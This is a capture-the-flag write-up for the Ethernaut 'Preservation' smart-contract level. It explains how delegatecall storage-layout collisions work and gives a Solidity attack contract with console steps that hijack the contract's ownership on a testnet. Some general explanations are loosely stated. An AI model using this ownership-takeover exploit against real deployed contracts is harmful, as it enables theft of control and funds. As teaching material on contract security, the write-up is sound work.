
# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

Challenge's message:

> This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored. The goal of this level is for you to claim ownership of the instance you are given. - Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope. - Understanding what it means for delegatecall to be context-preserving. - Understanding how storage variables are stored and accessed. - Understanding how casting works between different data types.


The **Preservation** contract is a smart contract that allows users to set the time for **two different time zones using delegate calls to library contracts**. The contract has designed to be **upgradable**, meaning that the logic for setting the time is separated into external library contracts, **which can be swapped without modifying the main contract**. The `timeZone1Library` and `timeZone2Library` variables store the addresses of two public library contracts that handle the logic for setting the time in different time zones. And there is a **storedTime** variable which stores the timestamp set by the library contracts.

The `setTimeSignature` constant variable holds the function signature for the **setTime(uint256) function** from the LibraryContract. Function signatures are the **first four bytes of the hash of the function name and parameter types**, used in delegate calls to ensure that the called function is correctly identified.

In the rest of the contract, it gets the libraries' address in the constructor, and then delegate calls this library's `setTime()` function in the LibraryContract with **signature** and **timeStamp** variables. After this, it will be a new value of the **storedTime** variable.

In summary, the **Preservation** contract acts as a gateway to external library contracts (timeZone1Library and timeZone2Library) using delegate calls. By separating the time-setting logic into external libraries, the contract becomes more modular and upgradable. The library contract LibraryContract handles the actual time-setting logic, while the Preservation contract manages library addresses and delegates the time-setting calls to the appropriate library.

## Context-Preserving

Context-preserving refers to a property in software or programming languages where the execution context, state, or behavior of a program remains unchanged or preserved during certain operations or transformations. This property is particularly important in cases where modifications or transformations need to be performed on a program without altering its fundamental behavior or the results it produces.

In various programming scenarios, the context may refer to different aspects:

- **Execution Context:** In the context of running code, it refers to the current state of the program, including the values of variables, the position of the program counter, and other relevant information. When an operation is context-preserving, it means that after executing that operation, the program continues to behave the same way it would have without the operation.
- **Calling Context:** In the context of function calls, it refers to the set of values and the order of the call stack. When an operation is context-preserving, it means that calling the operation won't disrupt the call stack or produce unexpected side effects.
- **Language Semantics:** In the context of programming languages, it refers to the rules and behaviors defined by the language specification. When a transformation or operation is context-preserving, it means that it adheres to the language semantics and doesn't violate the expected behavior of the language constructs.

Context-preserving operations are desirable in many situations, especially in areas like program optimization, code refactoring, and code analysis. When performing these tasks, maintaining the original program's correctness and behavior is crucial to ensure the reliability and safety of the software. If a transformation is not context-preserving, it might introduce bugs, security vulnerabilities, or unintended behavior, making it challenging to reason about the program's behavior and predict its outcomes accurately.

## Context-Preserving Delegation to On-Chain Libraries

Using context-preserving techniques when delegating operations to on-chain libraries is essential to ensure that the behavior of the main contract remains unchanged while leveraging the functionality provided by the libraries. Delegating operations to on-chain libraries is a common practice in Solidity to achieve code modularity, reusability, and upgradability.

Here's how context-preserving delegation works and its implications on execution scope:

### Function Signature and Delegatecall

- The main contract defines a function signature that matches the desired function in the library contract.
- The function signature is used to perform a delegatecall to the library contract. **Delegatecall allows the library contract to execute its logic in the context of the main contract, retaining the main contract's storage and state**.


### Library Contract Logic

- The library contract contains the actual implementation of the delegated function.
- When the library contract is called using delegatecall, it can read and modify the storage variables of the main contract as if it were executing directly within the main contract's scope.

### Preserving Main Contract's State

- Since the delegatecall allows the library to access and modify the main contract's storage, it's crucial to be careful when implementing the library logic.
- The library should avoid overwriting critical state variables in the main contract to ensure that the main contract's behavior remains unchanged.
- It's important to document and follow specific guidelines when writing library contracts to prevent unintended side effects on the main contract's state.

## Implications on Execution Scope

### Shared Storage and State

- **When using delegatecall, the library contract operates within the same storage space as the main contract**. This means the **library can access and modify the main contract's state variables**.
- This shared storage can lead to unexpected interactions if the library modifies state variables that are critical to the main contract's functionality.

### Limited Error Handling

- If the library contract encounters an error or reverts, **it will not revert the main contract's state changes made before the delegatecall**.
- This can make error handling challenging since the main contract might not be aware of the library's internal behavior and cannot rely on typical try-catch mechanisms.


### Security Considerations

- Careful attention should be given to the library contracts to avoid introducing security vulnerabilities.
- Malicious or poorly implemented libraries can lead to unexpected behavior and potential attacks on the main contract.

In conclusion, context-preserving delegation to on-chain libraries enables code reuse and modularity while allowing for upgradability. However, developers need to be cautious when implementing and using library contracts to ensure that the main contract's behavior and state are preserved, and potential security risks are minimized. Proper testing and auditing of library contracts are crucial to avoid unintended consequences and ensure the overall security and functionality of the system.


## Storage Layout Vulnerability

By now, we already know that when a delegatecall is used to update storage in Solidity, the state variables have to be declared in the same order. But what happens if we forget to declare the variables in the same order or declare the wrong type?

Let's create the two contracts, Library and Vulnerable:

```solidity
contract Library {
    uint public number;

    function updateNumber(uint _number) public {
        number = _number;
    }
}

contract Vulnerable {
    address public library;
    address public owner;
    uint public number;

    constructor(address _library) {
        library = _library;
        owner = msg.sender;
    }

    function updateNumber(uint _number) public {
        library.delegatecall(abi.encodeWithSignature("updateNumber(uint256)", _number));
    }
}
```

In the above code, we have two contracts. The first contract, Library, defines a state variable called number. It also has a function called saveNumber(). This function simply updates the value of number. In the second contract called Vulnerable, three state variables are defined. These are library, owner, number. The contract assigns the value of library to the address of the Library contract. It also sets the value of owner to msg.sender.

Finally, the Vulnerable contract also has a function called updateNumber() which takes in a unit, just like Library.updateNumber(). Vulnerable.updateNumber() makes a delegatecall using the address of the Library contract. Inside the delegatecall, it makes a request to the updateNumber() function inside the Library contract.

Now, let us make some observations. We first notice that the contract Library declares only one state variable, but the contract Vulnerable declares three state variables. This is the weak spot where any attacker will try to start exploiting the contract, Vulnerable. As we did in the last example, let us see how the owner of the Vulnerable contract can be hijacked because of this mistake. Take a look at this contract written to attack the Vulnerable contract:

```solidity
contract AttackVulnerable {

    address public library;
    address public owner;
    uint public number;

    Vulnerable public vulnerable;

    constructor(Vulnerable _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    function attack() public {
        vulnerable.updateNumber(uint(address(this)));
        vulnerable.updateNumber(1);
    }

    // function signature must match Vulnerable.updateNumber()
    function updateNumber(uint _number) public {
        owner = msg.sender;
    }
}
```

From the above code, our attacker is the contract called AttackVulnerable. The first thing we observe is that this contract has three state variables. These variables are in the same layout as the ones in the Vulnerable contract. It also has a state variable that holds the address of the Vulnerable contract. The actual value of the variable is assigned in the constructor.

```solidity
// The storage layout is the same as Vulnerable
    // This will allow the attacker to correctly update the state variables
    address public library;
    address public owner;
    uint public number;

  //The state variable to store the address of the contract, Vulnerable
    Vulnerable public vulnerable;

  //constructor
  constructor(Vulnerable _vulnerable) {
          vulnerable = Vulnerable(_vulnerable);
      }
```

Next, the attacker defines a function called **attack()**. In this function, the attacker calls the updateNumber() function inside the Vulnerable contract **twice**.

```solidity
function attack() public {
        // override address of library
        vulnerable.updateNumber(uint(address(this)));
        // call the function updateNumber() with any number as input.
        vulnerable.updateNumber(1);
    }
```

In the first call, the attacker passes his address as an argument to the `Vulnerable.updateNumber()` function. However, `Vulnerable.updateNumber()` takes a uint as its argument. To overcome this, the attacker cleverly **casts his address to uint**.

When the first call is executed, it will call the updateNumber() inside the Vulnerable contract. **The value of num will be the address of the attacker casted into a uint**. Vulnerable.updateNumber() will then delegatecall to the Library contract. This will call the updateNumber() function inside the Library contract.

Once this function is called, it will proceed to update the state variable inside it. This will set the state variable to the address of the attacker. Back inside the Vulnerable contract, the first variable will be updated since only the first variable in the Library contract was updated. Since the first variable in the Vulnerable contract is the address of the Library contract, the address of the Library contract will be updated to the address of the AttackVulnerable contract.

At this point, the execution of the first call is completed. So what happens when the second call, `vulnerable.updateNumber(1);` is made? Let’s find out:

When this is called, it will call the **updateNumber()** function inside the Vulnerable contract, as expected. Remember that the `Vulnerable.updateNumber()` function makes a delegatecall to the Library contract by using the value stored in the library state variable. However, the value of the library variable has been updated by the previous call. This means **the function will make a delegatecall to the AttackVulnerable contract**.

Once a delegatecall has been made to the AttackVulnerable contract, the `AttackVulnerable.updateNumber()` function is called. Let’s have a quick look at what the function does:

```solidity
function updateNumber(uint _number) public {
        owner = msg.sender;
    }
```

From the above code, we can see that it updates the owner state variable. But in this case, which owner state variable is going to be updated? Since the whole operation runs inside the context of the Vulnerable contract, **the owner state variable that will be updated** is the one inside the Vulnerable contract. Also, since msg.sender is the attacker’s address, Vulnerable’s address will be updated to the attacker’s address, making him the new owner of the Vulnerable contract.






# Subverting

In this challenge, we can easily figure out the storage layout vulnerability between Preservation and LibraryContract. That's why, we must mimic the Preservation contract layout structure in the attack contract. In the final step, add a `setTime(uint)` function that manipulates the target contract and sets the owner's value as our wallet address. After necessities, our attack contract looks like this: 

```solidity
pragma solidity ^0.8.20;

contract Attack{

    // imitation the `Preservation` contract layout structure
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time)public{
        owner = msg.sender;
    }

}
```

Let's hack the challenge!


Firstly, check the owner of the contract and timeZone1Library's address.

```js
await contract.owner()
'0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed'
```

```js
await contract.timeZone1Library()
'0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30'
```

After then, call the **setFirstTime()** function with our attack contract's address. See the transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xf9ebb1c25c237abaeec0ec801fd95a9d2ac3bd1c9a3d310eb2d14b64f916780d)

```js
await contract.setFirstTime("0xA970e836256FAa388Af589852039De9Dc8Ad6Fac")
```

It has updated the timeZone1Library's address as attacker contract's address.

```js
await contract.timeZone1Library()
'0xA970e836256FAa388Af589852039De9Dc8Ad6Fac'
```

Again, call the setFirstTime() function and get the ownership of the contract. See the transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xf399fafa9a83df0eb3670ad960635a28c95df0c95f49d21425578bf7ac2a8a43)

```js
await contract.setFirstTime("0xA970e836256FAa388Af589852039De9Dc8Ad6Fac")
```

```js
await contract.owner()
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
player
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
```


Ethernaut's message: 

> As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.

**_by wasny0ps_**
